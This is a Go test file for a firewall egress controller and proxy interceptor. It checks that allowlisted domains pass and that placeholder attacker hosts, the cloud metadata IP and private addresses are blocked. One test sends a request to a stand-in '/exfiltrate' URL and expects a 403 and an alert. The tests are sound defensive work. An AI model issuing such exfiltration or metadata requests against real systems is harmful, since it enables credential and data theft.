package firewall

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
)

func TestFirewallAllowlistAndSubdomains(t *testing.T) {
	hub := NewAlertHub(100)
	fw := NewController(hub)

	// Test allowed domain
	allowed, reason := fw.IsAllowed("github.com")
	if !allowed {
		t.Fatalf("expected github.com to be allowed, got blocked: %s", reason)
	}

	// Test allowed subdomain
	allowed, _ = fw.IsAllowed("api.github.com")
	if !allowed {
		t.Fatalf("expected api.github.com to be allowed")
	}

	// Test blocked domain
	allowed, _ = fw.IsAllowed("evil-exfiltration-target.com")
	if allowed {
		t.Fatalf("expected evil-exfiltration-target.com to be blocked")
	}

	// Test metadata IP blocking
	allowed, reason = fw.IsAllowed("169.254.169.254")
	if allowed {
		t.Fatalf("expected AWS metadata IP 169.254.169.254 to be blocked")
	}
	if !strings.Contains(reason, "blocked subnet") {
		t.Fatalf("expected reason to mention blocked subnet, got: %s", reason)
	}

	// Test private subnet blocking
	allowed, _ = fw.IsAllowed("192.168.1.50")
	if allowed {
		t.Fatalf("expected private IP 192.168.1.50 to be blocked")
	}
}

func TestProxyInterceptorBlocking(t *testing.T) {
	hub := NewAlertHub(100)
	fw := NewController(hub)
	proxy := NewProxyInterceptor(fw)

	if err := proxy.Start(); err != nil {
		t.Fatalf("failed to start proxy: %v", err)
	}
	defer proxy.Close()

	proxyURL, err := url.Parse(proxy.Addr())
	if err != nil {
		t.Fatalf("parse proxy url: %v", err)
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Attempt request to forbidden external host
	resp, err := client.Get("http://attacker-controlled-server.com/exfiltrate")
	if err != nil {
		t.Fatalf("http request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected HTTP 403 Forbidden, got: %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), "egress_blocked") {
		t.Fatalf("expected egress_blocked in body, got: %s", string(body))
	}

	// Verify alert was logged in AlertHub
	alerts := hub.List(10)
	if len(alerts) == 0 {
		t.Fatalf("expected alert in hub")
	}
	if alerts[0].Action != "BLOCK" {
		t.Fatalf("expected alert action BLOCK, got: %s", alerts[0].Action)
	}
	if alerts[0].Severity != "critical" {
		t.Fatalf("expected critical severity, got: %s", alerts[0].Severity)
	}
}
